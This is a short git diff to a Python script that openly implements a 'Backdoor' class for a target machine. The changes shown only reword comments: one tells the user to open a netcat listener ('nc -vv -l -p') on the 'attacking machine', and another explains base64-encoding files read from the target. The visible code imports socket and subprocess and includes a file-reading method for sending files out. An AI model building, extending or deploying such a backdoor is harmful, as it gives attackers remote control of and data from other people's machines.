@@ -1,7 +1,9 @@
 #!/usr/bin/env python
 
 # Use this to open socket and listen on attacking machine for connection from target:
-# nc -vv -l -p (port number) or use listener.py
+# Netcut: nc -vv -l -p (port number) 
+# OR
+# use listener.py
 
 import socket
 import subprocess
@@ -55,7 +57,7 @@ class Backdoor:
         with open(file_path, "rb") as file:
             # Returning with base64 encoding, 
             # which converts unknown characters to known characters
-            #  that json and python can parse
+            # that json and python can parse
             return base64.b64encode(file.read())
 
     def write_file(self, file_path, content):
